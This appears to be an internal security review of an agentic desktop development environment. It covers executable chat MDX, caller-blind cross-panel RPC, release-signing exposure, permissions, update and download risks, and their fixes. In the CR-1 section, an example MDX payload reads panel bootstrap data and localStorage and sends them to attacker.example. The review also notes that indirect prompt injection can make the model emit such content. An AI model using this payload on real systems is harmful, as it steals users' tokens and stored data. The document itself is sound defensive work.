# Client Runtime and Supply-Chain Security Review

Date: 2026-07-27

Scope: Electron/browser panel boundaries, rich chat rendering, client-side persistence,
navigation and OS integration, runtime dependency exposure, update/install behavior, and
desktop/mobile release workflows.

This is a source review, not a penetration-test certification. Evidence gathering did not
exercise destructive payloads; the post-review remediations described below do change
product code and workflows. Findings are ranked by the impact that is realistically
reachable in Vibestudio, not by scanner labels alone.

## Executive summary

The most important client-side issue is architectural: completed chat messages containing
JSX are intentionally passed to the MDX JavaScript evaluator and rendered in the same
workspace panel that hosts `client_eval`. This is agent-authored executable UI, not ordinary
Markdown, and the panel is deliberately its client-affine execution vessel. The missing
boundary is therefore not a separate sandboxed renderer: individual authored executions
need dynamic authority facts instead of inheriting the chat panel's broad fixed manifest
ceiling.

The impact is compounded by a separate confused-deputy boundary. The relay deliberately
allows authenticated participants to call other panels, while the portable `expose`
wrapper discards the authenticated caller context. The terminal panel consequently exposes
session discovery, scrollback, input, and command execution to any participant that can
address it, with no receiver-side caller policy. Rich-message execution is therefore one
route into a broader workspace capability; it is not the only route.

The original release workflows also used mutable Action tags and exposed signing and
notarization credentials across the macOS job. Those defects were repaired after the source
review with immutable pins, minimal job permissions, secret-free compilation, checksummed
artifacts, and separate publication jobs. Packaging/signing/notarization remain coupled
inside `electron-builder --mac`; fully isolating signing requires redesigning that package
step.

Several medium risks are worth addressing through shared abstractions rather than a series
of prompts and blocklists:

- Electron permission handling default-allows every permission not in a handwritten
  "sensitive" set, including future Chromium/Electron permission names.
- the context-menu "Open Link Externally" path bypasses the application's scheme validation
  and approval-aware external-open service;
- serialized agent scope is plaintext origin storage shared by panels in the same context;
- the npm self-updater gives package lifecycle code the complete desktop process
  environment.

The reviewed `ws` exposure was repaired in the working tree. Both lockfiles force patched
6/7/8 releases, and local RPC now resolves credentials through a bounded typed HTTP
admission exchange before allocating a WebSocket receiver.

The recommended synthesis is not to remove rich responses, cross-panel automation,
browser-like permissions, one-click updates, or normal downloads. It is to make authority
explicit at the relevant semantic boundary:

1. bind each authored MDX or `client_eval` run to exact dynamic execution authority;
2. preserve authenticated caller context to receiver-declared RPC contracts;
3. derive panel CSP, storage, and Electron permissions from capabilities;
4. keep build, signing, and publication authority structurally separate where tooling
   permits it;
5. use a reachability/VEX dependency gate instead of blindly blocking on every transitive
   scanner result.

## Severity summary

| ID   | Severity         | Finding                                                                        | Confidence  |
| ---- | ---------------- | ------------------------------------------------------------------------------ | ----------- |
| CR-1 | Critical         | Model/collaborator-authored chat MDX executes as panel JavaScript              | High        |
| HI-1 | High             | Workspace-wide relay plus caller-blind panel RPC creates confused deputies     | High        |
| HI-2 | High             | Release actions and macOS signing secrets have excessive supply-chain exposure | High        |
| ME-1 | Medium           | Unknown Electron permissions are default-allowed                               | High        |
| ME-2 | Medium           | Context-menu external opening bypasses URL policy and approval abstraction     | High        |
| ME-3 | Medium           | Reachable `ws` advisory permitted pre-authentication memory exhaustion (fixed) | High        |
| ME-4 | Medium           | Agent scope persistence is plaintext and shared within a context origin        | Medium-high |
| ME-5 | Medium           | Self-update package installation inherits the full app environment             | Medium      |
| LO-1 | Low              | Browser downloads have no quota/concurrency or dangerous-file policy           | Medium-high |
| DH-1 | Defense in depth | One permissive panel CSP is used for all workspace panels                      | High        |
| DH-2 | Process          | Known-advisory triage and GitHub Action pin maintenance are not automated      | High        |

## Threat model used

The review treats these inputs as untrusted even if they are normal product inputs:

- model output, including output produced after indirect prompt injection;
- other participants' messages and imported/persisted conversation data;
- arbitrary sites loaded in browser panels;
- authored or generated workspace panels that are not intended to possess every other
  panel's authority;
- npm packages, install scripts, GitHub Actions, registries, and update metadata;
- URLs and filenames supplied by web content.

It does not assume that arbitrary workspace code can be made harmless. Vibestudio is an
agentic development environment, so authored code often needs substantial power. The
security goal is to keep data/rendering, code execution, and authority acquisition distinct
enough that the user and the receiver can reason about them.

## CR-1 — Chat transcript MDX executes as privileged panel JavaScript

**Severity:** Critical\
**Confidence:** High\
**Status:** Verified from the source

### Evidence

- `workspace/packages/agentic-chat/components/MessageContent.tsx:64-82` sends message
  `content` to the rich renderer whenever it contains an uppercase JSX-looking tag or
  Markdown syntax.
- `workspace/packages/agentic-chat/components/RichMessageContent.tsx:79-99` calls
  `@mdx-js/mdx` `evaluate(content, ...)`.
- `workspace/packages/agentic-chat/components/RichMessageContent.tsx:112-153` compiles
  completed, non-streaming JSX-like content and mounts the resulting component.
- `workspace/packages/agentic-chat/components/MessageCard.tsx:881-900` passes
  `msg.content` to this renderer without a sender/trust distinction.
- `workspace/packages/harness/src/system-prompt.ts:41-50` explicitly teaches the model to
  emit MDX/JSX. The instruction not to emit arbitrary JavaScript is useful product guidance,
  but prompts are not a security boundary.
- `src/preload/panelPreload.ts:28-68` exposes the RPC envelope transport, bootstrap/init
  data, native services, and external-opening calls to the panel main world.
- `packages/shell-core/src/panelManager.ts:1085-1111` shows that panel bootstrap data
  contains the caller-bound gateway token, panel identity, environment, and state arguments.
- `packages/shared/src/constants.ts:72-80` permits `unsafe-eval` and broad HTTPS/WebSocket
  egress. `src/server/buildV2/builder.ts:1153-1155` injects this policy into panel HTML.

MDX `evaluate` is a JavaScript evaluator, not an allowlisted component parser. Restricting
the component map does not prevent JavaScript expressions from reading globals or causing
side effects during render. A representative shape is:

```mdx
<Text>
  {(() => {
    void window.__vibestudioShell?.getPanelInit?.().then((init) =>
      fetch("https://attacker.example/collect", {
        method: "POST",
        body: JSON.stringify({
          init,
          storage: Object.fromEntries(
            Array.from({ length: localStorage.length }, (_, i) => localStorage.key(i))
              .filter(Boolean)
              .map((key) => [key, localStorage.getItem(key)])
          ),
        }),
      })
    );
    return "Loading…";
  })()}
</Text>
```

The exact payload need not look suspicious in the transcript; JavaScript can be placed in
props and expressions throughout JSX.

### Exploit preconditions

An attacker needs a completed transcript message containing JSX/MDX. Plausible sources are
indirect prompt injection in content the agent reads, a compromised/malicious provider,
another participant, or imported/persisted transcript data. No separate user click is
required to run a render expression.

### Impact

Code executes with the chat panel's ambient authority. At minimum it can read and mutate the
DOM and origin storage and exfiltrate them over the permissive network policy. It can call
the exposed host bridge, obtain its own bootstrap data, send authenticated RPC envelopes as
the panel, invoke permitted local services, and present deceptive UI. The workspace relay
finding below significantly increases the potential blast radius.

### Original recommendation (superseded): keep rich responses, remove the evaluator

This recommendation was made before the product intent was clarified. The chat panel is
specifically the execution vessel for MDX and `client_eval`; replacing the evaluator would
remove a core capability instead of repairing its authority boundary. Retain the evidence
above, but use the dynamic-vessel design in the post-review section below as the remediation.

Replace runtime MDX JavaScript evaluation with a declarative message-UI compiler:

1. Parse Markdown plus a constrained JSX-like syntax to an AST.
2. Reject all expression containers, spreads, event handlers, imports/exports, member access,
   and executable values.
3. Resolve only an explicit component registry.
4. Validate each component's props against a schema and permit only JSON-serializable
   values. For example, `ActionButton` can retain a declarative `message: string` prop whose
   click is implemented by trusted React code.
5. Treat SVG as sanitized data or a constrained drawing AST. Keep Mermaid in strict mode and
   test the exact configured Mermaid version against link/script payloads.
6. Render invalid constructs as source with an explanation, so a model formatting mistake
   degrades gracefully instead of losing the answer.

This preserves scanable callouts, tables, diagrams, and actions while making the model's
output data rather than code. It is also better agentic DX: the supported UI grammar becomes
machine-readable and can produce precise validation feedback.

If genuinely programmable response UI is required, it should be a distinct explicit artifact
rendered in an origin-isolated sandbox with no panel preload, no shared storage, no network
by default, and a narrow schema-checked `postMessage` intent protocol. It must not share the
chat panel's origin or bridge.

Add adversarial tests covering expressions, getters, spreads, event props, imports, dynamic
URLs, SVG, malformed/stream-to-complete transitions, historical messages, and messages from
every sender type.

## HI-1 — Workspace-wide relay plus caller-blind receivers create confused deputies

**Severity:** High\
**Confidence:** High\
**Status:** Verified from implementation and tests

### Evidence

- `src/server/rpcServer.ts:2753-2783` documents and implements open relay authorization
  between authenticated participants, except for the `extension.*` host-control namespace
  and any optional host hook.
- `src/server/rpcServer.test.ts:963-976` explicitly verifies that a panel can relay to
  another panel, durable object, or worker.
- `packages/rpc/src/types.ts:447-454` supplies exposed handlers with an authenticated
  `RpcRequestContext`, including `caller` and `origin`.
- `workspace/packages/runtime/src/setup/createBaseRuntime.ts:237-239` discards that context
  and invokes portable handlers with only spread arguments.
- `workspace/panels/terminal/TerminalApp.tsx:14-17` repeats the same caller-discarding
  wrapper locally.
- `workspace/panels/terminal/TerminalApp.tsx:639-683` exposes powerful methods including
  `terminal.sendText`, `terminal.getScrollback`, `terminal.runCommand`, and
  `terminal.listSessions`.
- `workspace/packages/runtime/src/panel/agentApi.ts:28-72` exposes DOM snapshots, panel
  structure/state/routes, and `setMode` through the same receiver model.

### Exploit preconditions

An authenticated workspace participant needs the target runtime/entity ID. Those identities
are normal platform routing data, and the terminal's own discovery method then reveals
sessions. The caller can be compromised code, an over-privileged generated panel, or code
execution such as CR-1.

### Impact

A caller can use the terminal panel as a deputy to discover terminal sessions, read
scrollback, inject text into a running session, or start a command under the terminal panel's
authority. That can expose credentials shown in a terminal, alter ongoing work, and execute
host commands. Generic `_agent.*` endpoints similarly disclose or mutate another panel's
state. Auditing only the relay is insufficient because the receiver has thrown away the
identity required to make a local authorization decision.

### Recommendation: receiver-declared, caller-preserving RPC contracts

Do not fix this with a global method blacklist; new panels and methods would recreate the
same problem. Make caller handling part of the contract:

- Change the portable exposure primitive to pass `RpcRequestContext` by default.
- Require each exposed method to declare a caller policy, such as `self`, `parent`,
  `descendant`, `same-app`, `specific service principal`, or an explicit capability.
- Let the relay enforce coarse reachability, but make the receiver contract authoritative
  for semantics and resource scope.
- Make sensitive calls resource-aware. A terminal capability should distinguish create a
  new isolated session, read a named session, write to it, and run a command; possession of a
  panel ID should not imply all four.
- Preserve the verified caller and origin through wrappers, generated clients, logs, tests,
  and approval UX. Fail closed when an older handler has not declared a policy.
- Offer safe high-level cross-panel intents for normal agents, so secure automation remains
  easier than constructing raw relay calls.

This keeps cross-panel agent workflows first-class while preventing a panel from
accidentally becoming an authority-laundering deputy.

## HI-2 — Release actions and signing secrets have excessive exposure

**Severity:** High\
**Confidence:** High\
**Status:** Verified workflow weakness; exploitation requires dependency/action compromise

### Evidence

- `.github/workflows/release.yml:12-13` grants the release workflow `contents: write`.
- `.github/workflows/release.yml:41-43` and `:75-77` use mutable
  `actions/checkout@v4`, `pnpm/action-setup@v4`, and `actions/setup-node@v4`.
- `.github/workflows/release.yml:67-73` defines Apple signing/notarization credentials at
  job scope.
- `.github/workflows/release.yml:84-88` runs both dependency installations and the complete
  build while those credentials are present.
- `.github/workflows/ci.yml:14-22`, `.github/workflows/build-mobile.yml:21-43`,
  `:71-72`, `:131-132`, `:163-171`, and
  `.github/workflows/webrtc-e2e-nightly.yml:20-28`, `:48-58`, `:70-76` use mutable
  action tags, including a third-party Android emulator action.
- The release-upload action is pinned to a full SHA
  (`.github/workflows/release.yml:20-22` and
  `.github/workflows/build-mobile.yml:141-148`), which is a good control.
- Comments say Dependabot should refresh the pinned action, but there is no
  `.github/dependabot.yml`.
- `package.json:99-124` pins pnpm, restricts packages allowed to run build scripts, and
  records overrides/patches. Frozen lockfiles are used in workflows. These materially reduce
  but do not eliminate exposure.

### Exploit preconditions

A mutable action tag is moved or its upstream release is compromised; alternatively, a
dependency/build script reachable during the macOS build is compromised. The latter is
harder because lifecycle scripts are restricted, but application build code remains a large
trusted computing base.

### Impact

An attacker could exfiltrate Apple credentials, tamper with a signed/notarized artifact, or
abuse the workflow's GitHub token. Because an initial GitHub release is created before the
installer jobs, a failing or unvalidated build can also leave an incomplete release object.
The workflow does not produce an attestation tying each released installer to the reviewed
commit and exact build inputs.

### Recommendation: unsigned build, digest, isolated signing

1. Pin every GitHub Action to a full commit SHA, including official actions. Add a
   `github-actions` Dependabot configuration or equivalent bot to propose reviewed updates.
2. Give each job the minimum explicit `permissions`; use `contents: read` for build jobs and
   write only in the final publisher.
3. Build and test unsigned artifacts in a credential-free job. Produce checksums, an SBOM,
   and provenance.
4. Pass an immutable artifact to a separate protected signing/notarization job. Expose Apple
   secrets only to the exact signing step and sign the verified digest, not a rebuilt tree.
5. Publish only artifacts whose digest and attestation match the tagged commit. Gate release
   publication on CI for that exact commit and on the tag being reachable from the protected
   release branch.
6. Use protected GitHub environments and required reviewers for production signing and
   release publication.

Mobile signing secrets are already mostly step-scoped, which is the right direction.
However, pin setup/cache actions too: an earlier compromised action can persist modifications
that execute later when the Gradle step receives secrets.

## ME-1 — Unknown Electron permissions are default-allowed

**Severity:** Medium\
**Confidence:** High\
**Status:** Verified policy behavior; concrete impact varies by permission and platform

### Evidence

- `src/main/index.ts:1660-1671` defines a finite handwritten set of sensitive permission
  strings.
- `src/main/index.ts:1724-1757` applies special policy only to that set and then calls
  `callback(true)` for every other request, explicitly including clipboard reads.
- `src/main/index.ts:1758-1774` also returns `true` for every omitted permission in the check
  handler.
- `src/main/services/browserPermissionController.ts:107-223` has substantially stronger
  top-level-origin, panel-type, OS-permission, navigation-cancellation, and grant checks for
  media, location, and notifications. This is a good foundation.

### Exploit preconditions and impact

An arbitrary site in a browser panel requests an Electron/Chromium permission omitted from
the set. Some permission types still require user activation or a native chooser, so impact
is permission-specific. Clipboard read is the clearest current concern; future Electron
versions may add permission names that silently inherit allow behavior.

### Recommendation

Use a typed exhaustive permission policy registry rather than a sensitive-name exception
list. Unknown permissions should deny and emit structured telemetry. Known permissions
should select a semantic policy by surface:

- browser panel: native browser-like prompt/chooser when that is the expected web UX;
- app panel: declared manifest capability plus origin/resource checks;
- code/workspace panel: deny by default or require an explicit capability;
- harmless/reversible presentation permissions: explicitly allow where intended.

Add a version-upgrade test that compares the registry to Electron's supported permission
type so a new name causes a review failure, not a user-facing regression. This retains
ordinary fullscreen/media behavior without treating all future permissions as harmless.

## ME-2 — Context-menu external opening bypasses canonical URL policy

**Severity:** Medium\
**Confidence:** High\
**Status:** Verified bypass; user interaction is required

### Evidence

- `src/main/viewManager.ts:774-784` offers "Open Link Externally" for any nonempty
  `params.linkURL` and passes the raw value directly to Electron
  `shell.openExternal`.
- `src/server/services/externalOpenService.ts:20`, `:35-91`, and `:103-116` provide the
  canonical approval-aware path and restrict schemes to HTTP, HTTPS, and `mailto`.
- `src/main/panelView.ts:719-745` rejects unsupported schemes for normal window-open
  navigation, showing that the context menu is inconsistent with the standard path.

### Exploit preconditions and impact

A malicious site or rendered document supplies a `file:`, `smb:`, or custom-protocol link
and persuades the user to select the context-menu action. The OS may then contact a network
share, disclose network credentials, open a local file, or invoke a vulnerable/custom
protocol handler. Exact consequences are OS-dependent.

### Recommendation

Create one typed `ExternalTarget` parser/presenter/executor used by RPC, link interception,
context menus, OAuth flows, and native code. Ordinary HTTP(S)/mailto links should preserve
the current one-action UX. Unsupported or high-risk schemes should be absent or require a
specific confirmation that shows the scheme and normalized target. Do not add a second
context-menu-only blocklist.

## ME-3 — Reachable `ws` memory-exhaustion advisory before authentication (resolved)

**Severity:** Medium application risk (upstream advisory: High)\
**Confidence:** High\
**Status:** Resolved in the working tree

### Evidence at the reviewed revision

On 2026-07-27, `pnpm audit --prod --json` reported direct `ws@8.19.0` affected by
GHSA-96hv-2xvq-fx4p, "Memory exhaustion DoS from tiny fragments and data chunks"; the fixed
8.x version is 8.21.0 or later.

- `package.json:216` declares `ws`.
- `src/server/gateway.ts:505-507` explicitly constructs the gateway WebSocket server with
  no payload cap.
- `src/server/rpcServer.ts:1128-1131` does the same for direct RPC handling.
- `src/server/rpcServer.ts:1144-1202` upgrades the socket, waits up to ten seconds for the
  first authentication message, and parses that frame before authentication.
- The gateway is documented as loopback-only and enforces an Origin allowlist
  (`src/server/gateway.ts:500-529`), reducing exposure. Origin is not authentication, and
  non-browser clients can omit it.

### Exploit preconditions and impact

The attacker must reach the local gateway, normally from the same host or an allowed local
web origin, and send the adversarial WebSocket fragmentation pattern. They do not need an RPC
token because the affected processing occurs before the application authentication frame.
Successful exploitation exhausts memory and terminates or destabilizes the local hub.

### Recommendation

Upgrade the direct `ws` dependency to at least 8.21.0 and run transport tests. Also give the
gateway a reviewed `maxPayload`, bound concurrent pending-auth sockets per source, shorten or
adaptively budget pre-auth time, and meter bytes/frames before successful authentication.
The cap should be based on actual control-envelope sizes; large developer payloads should
continue to use the existing streaming/bulk path rather than inflate the control channel.

### Implemented remediation

Root and workspace lockfiles now force `ws@6.2.4`, `ws@7.5.11`, and `ws@8.21.1`, so the
reachable production graph no longer contains the vulnerable releases. `RpcServer` owns the
gateway RPC upgrade and configures a 16 MiB control-plane payload ceiling; CDP/inspector
receivers retain a reviewed 256 MiB post-admission limit.

Before local RPC upgrade, the client sends an empty-body typed HTTP admission request, with
its credential in Authorization plus a percent-encoded label and enumerated platform in
bounded headers. Browser OPTIONS/POST is guarded by the same WebSocket Origin allow-list.
The server reserves capacity before asynchronous work, allowing 32 concurrent credential
resolutions and 1,024 outstanding 15-second, one-use grants. Typed failures distinguish
invalid/admin credentials, malformed requests, saturation, and unavailability, with retry
timing where appropriate.

Upgrade accepts only an admission grant, atomically consumes it, and revalidates its
token/grant principal and incarnation before `ws` receiver allocation; no
direct-token/bootstrap path remains. The first frame constant-time matches the grant and
exactly binds admitted metadata while retaining RPC contract negotiation.

Fresh one-time pairing redemption alone receives a 30-second process-keyed HMAC retry
record. An exact-metadata retry rotates the sole prior grant, preserving recovery from a
lost admission response or auth result without creating an alternate socket-authentication
path. Returning refresh/token credentials are not cached. Revocation invalidates
outstanding grants and retries; clients obtain fresh grants for pre-open transport retry,
reject refresh that returns the same rejected token, and preserve stale-token
refresh/cold-recovery UX.

## ME-4 — Agent scope persistence is plaintext shared-origin storage

**Severity:** Medium\
**Confidence:** Medium-high\
**Status:** Verified storage design; practical isolation expectation depends on context trust

### Evidence

- `workspace/packages/agentic-chat/utils/localStorageScopePersistence.ts:9-22` selects
  `localStorage`.
- `workspace/packages/agentic-chat/utils/localStorageScopePersistence.ts:24-67` stores the
  serialized `data` field without encryption or redaction at this layer.
- `workspace/packages/agentic-chat/utils/localStorageScopePersistence.ts:73-125` enumerates
  every row under a predictable prefix and filters authorization only after reading it.
- `src/main/panelView.ts:266-296` selects the Electron session partition from `contextId`.
  Panels in one context consequently share a partition; panel URLs also share the loopback
  origin.
- `src/main/viewManager.ts:553-556` confirms that storage/session isolation is partition
  based.

### Exploit preconditions and impact

Another panel executing code in the same context and origin can enumerate these keys
directly. Serialized evaluation scope may contain conversation-derived data, tool results,
or accidentally retained credentials. CR-1 can read the same store from the chat panel.

The current workspace-wide RPC trust model already weakens panel isolation, so this finding
is partly an amplifier. It becomes more important when HI-1 is repaired; storage must not
silently recreate the same cross-panel authority.

### Recommendation

Move scope rows to an authority-checked host service keyed by workspace/context, channel,
panel entity, and user principal. Keep large blobs content-addressed, but return only scoped
handles after authorization. Define serialization classes:

- durable non-secret data;
- volatile values that never persist;
- secret handles whose raw value remains in the credential service;
- explicitly shareable context data.

This preserves session continuity and agent recall. Encrypting every localStorage value with
a key delivered to every same-origin panel would not fix the boundary.

## ME-5 — npm self-update inherits the complete app environment

**Severity:** Medium\
**Confidence:** Medium\
**Status:** Verified exposure; presence of valuable secrets in the desktop environment varies

### Evidence

- `src/main/updateCheck.ts:115-133` discovers updates from the npm registry.
- `src/main/updateCheck.ts:165-206` requires an explicit update action and warns before
  restarting an owned local hub. This is good UX and consent handling.
- `scripts/npm-update-launcher.mjs:438-463` runs `npm install --global` for an exact version,
  but supplies `env: process.env`.

### Exploit preconditions and impact

A compromised release package or transitive install script executes during an update. It
can read every environment variable inherited by the desktop process, which may include
provider tokens, proxy credentials, registry credentials, or unrelated launcher secrets.
Installing application code from npm is inherently trusted, but unrelated ambient secrets
do not need to be part of that trust decision.

### Recommendation

Construct the updater environment from an allowlist: paths and user directories, locale,
required proxy/CA variables, and narrowly selected npm configuration. Explicitly strip
provider/API tokens, Vibestudio credentials, signing variables, and unrelated app env.
Longer term, publish a self-contained verified artifact so installation does not require
package lifecycle scripts. Verify the package integrity/digest against signed update
metadata before replacing the current installation, while keeping the current one-click,
rollback-friendly flow.

## LO-1 — Browser downloads lack resource and dangerous-file policy

**Severity:** Low\
**Confidence:** Medium-high\
**Status:** Verified hardening gap

### Evidence

- `src/main/services/browserDownloadManager.ts:86-137` automatically chooses a Downloads
  path for each browser download and tracks progress.
- `src/main/services/browserDownloadManager.ts:213-225` uses `basename`, sanitization, and
  collision handling, which correctly addresses filename traversal and overwrite.
- `src/main/services/browserDownloadManager.ts:75-83` opens a completed download without an
  extension/risk-specific warning.

### Risk

A malicious site can initiate repeated or very large downloads, consuming disk and creating
notification noise. A user can also open an executable/script-like download without a
Vibestudio-specific risk cue. Chromium and OS controls may provide additional protection,
so this is not ranked as a direct code-execution finding.

### Recommendation

Keep browser-like auto-download behavior, but add per-origin concurrency and byte budgets,
clear pause/cancel affordances, and a warning only when the user tries to open a dangerous
file class. Preserve OS provenance/quarantine metadata where supported. Do not prompt for
every normal document download.

## DH-1 — One permissive CSP is used for all workspace panels

**Class:** Defense in depth and blast-radius amplifier\
**Confidence:** High

`packages/shared/src/constants.ts:66-80` intentionally defines a broad CSP:

- arbitrary HTTPS script/style/image/font sources;
- `unsafe-inline` and `unsafe-eval`;
- broad HTTP(S)/WebSocket connection destinations;
- no `object-src`, `base-uri`, `form-action`, or effective `frame-ancestors` directive.

`src/server/buildV2/builder.ts:1153-1155` injects it as a meta policy. A meta CSP cannot
provide all protections available in an HTTP header, notably useful framing protection.

This is not, by itself, a vulnerability in an environment designed to execute authored
workspace code. Treating CSP as a sandbox for intentionally programmable panels would be
misleading. It does, however, turn any injection such as CR-1 into immediate eval and
arbitrary egress and makes a compromised remote import broadly useful.

Generate a CSP profile from the compiled unit manifest/build report:

- bundled/self scripts by default;
- `unsafe-eval` only for a separately isolated evaluator surface that genuinely requires it;
- exact dependency CDN origins and preferably integrity metadata where remote modules remain;
- declared egress origins translated to `connect-src`;
- `object-src 'none'`, `base-uri 'none'`, a deliberate `form-action`, and an HTTP
  `frame-ancestors` policy for privileged panel pages.

The build system should produce this policy automatically. Requiring users or agents to
hand-author CSP strings would be brittle agentic DX.

## DH-2 — Advisory triage and action-pin maintenance are not automated

**Class:** Security process\
**Confidence:** High

Two audits were captured on 2026-07-27:

- root: 2 critical, 32 high, 49 moderate, 8 low across 1,189 production dependencies;
- `workspace/`: 0 critical, 3 high, 3 moderate, 3 low.

These counts are not application severities. Reachability review found:

- the direct `ws` issue was reachable at the reviewed revision and is reported as
  resolved ME-3;
- critical `shell-quote` is on a React Native CLI `launch-editor` development path;
- critical `websocket-driver` is under Firebase Realtime Database compatibility code, while
  the app imports only Firebase app/messaging in `src/server/services/pushService.ts:273-284`;
- the `@modelcontextprotocol/sdk` cross-client leak is transitive under
  `@earendil-works/pi-ai`/Google GenAI, with no reviewed reuse of an MCP server/transport
  found in application source;
- root-lock `devalue` and `protobufjs` advisories require sparse-array deserialization or
  attacker-controlled descriptors/`Any` conversion respectively; no confirmed application
  path was found. The independently installed workspace lock already resolves newer
  `devalue@5.8.1` and `protobufjs@7.6.4`, though the latter still has a newer parser DoS
  advisory.

`.github/workflows/ci.yml:29-51` installs, type-checks, lints, formats, and tests, but has no
dependency advisory/VEX step. The workflows' Dependabot comments also lack the configuration
needed to maintain action pins.

Add a lockfile-scoped dependency inventory and a small reviewed VEX ledger containing:
advisory, exact path, shipped surface, attacker input, reachability, owner, decision, and
expiry. Release policy should block reachable critical/high issues and expired exceptions,
not every scanner label. Audit both lockfiles explicitly. Add automated PRs for npm and
GitHub Action pins, SBOM generation, and a release diff that highlights new executable
dependencies and lifecycle scripts.

## Positive controls observed

The review found several controls worth preserving:

- Every Electron view is created with `nodeIntegration: false`,
  `contextIsolation: true`, `sandbox: true`, and `webviewTag: false`
  (`src/main/viewManager.ts:548-568`).
- External browser panels use a reduced browser/autofill preload and a dedicated persistent
  browser partition (`src/main/panelView.ts:390-444`), rather than the privileged workspace
  panel preload.
- Normal navigation/window-open handling rejects non-HTTP(S) external schemes
  (`src/main/panelView.ts:719-745`).
- Sensitive browser permission handling verifies top-level origin, panel type, stored grant,
  OS state, and navigation lifetime (`src/main/services/browserPermissionController.ts`).
- The external-open service normalizes destinations, limits schemes, and integrates
  authority presentation (`src/server/services/externalOpenService.ts`).
- Download filenames use basename sanitization and collision-free paths.
- The release upload action is pinned to a commit SHA, mobile release checksums are
  generated, lockfiles are frozen, and package lifecycle builds are restricted.
- Markdown fallback rendering does not enable raw HTML. Syntax highlighting inserts the
  highlighter's escaped output, and Mermaid is configured with strict security; these are
  not substitutes for fixing the MDX evaluator, but they avoid additional obvious sinks.

## Post-review architecture decision and remediation status

The product intentionally uses the chat panel as the client-affine execution vessel
for both MDX and `client_eval`. CR-1's evidence about ambient fixed panel authority
remains valid, but its original recommendation to replace MDX with a declarative
renderer has been superseded. The selected design retains the same panel runtime and
identity while attaching an exact, short-lived dynamic execution fact to each authored
run. See `docs/dynamic-vessels-and-userland-capabilities.md`.

The following review items were repaired in the working tree:

- every GitHub Action reference is pinned to a verified full commit SHA;
- workflows use explicit least-privilege job permissions and non-persistent checkout
  credentials;
- build jobs publish checksummed artifacts under read-only tokens and distinct jobs
  verify and release them;
- Apple secrets are restricted to the irreducible macOS package/sign/notarize step;
- direct and transitive `ws` 6/7/8 lines are overridden to patched releases throughout
  both lockfiles;
- local RPC uses bounded typed HTTP admission and a short-lived one-use grant before
  WebSocket upgrade, with retry-safe first-device pairing recovery;
- Dependabot now maintains GitHub Action pins.

An entirely isolated macOS signing job remains architectural work because the current
`electron-builder --mac` command couples packaging, signing, and notarization.

## Prioritized remediation roadmap

### Immediate

1. Implement dynamic-vessel execution facts for authored MDX and `client_eval`.
2. Preserve `RpcRequestContext` and deny powerful panel methods unless their receiver
   contract explicitly permits the caller. Prioritize terminal read/write/execute methods.

### Next release cycle

1. Introduce receiver-declared userland capabilities and scoped terminal session handles.
2. Migrate other userland approval gates to host-enforced capability definitions.
3. Replace Electron's unknown-permission allow with the exhaustive policy registry.
4. Route context-menu external opens through the canonical typed target abstraction.
5. Separate unsigned build, signing, attestation, and publication jobs.

### Following cycle

1. Move agent scope to principal/panel-authorized storage with secret handles.
2. Generate CSP/egress policy from unit capabilities.
3. Harden updater environment and verified artifact installation.
4. Add dependency VEX, SBOM, GitHub Action update automation, and release provenance.
5. Add download quotas and dangerous-file open UX.

## Verification criteria

The highest-risk fixes should be considered complete only when tests demonstrate:

- every authored MDX and `client_eval` run is bound to exact source and dynamic
  execution authority, while passive panel activity cannot reuse that authority;
- a panel, worker, durable object, and agent cannot call terminal or `_agent.*` methods
  outside receiver-declared policy, and allowed automation still works;
- unknown Electron permission names deny and generate a review signal;
- every external-open entry point produces the same normalized decision;
- unauthenticated fragmented WebSocket traffic remains within fixed memory/concurrency
  budgets;
- release signing receives only a digest-verified artifact and secrets are absent from
  setup/install/build steps;
- same-context panels cannot enumerate another panel's retained agent scope.
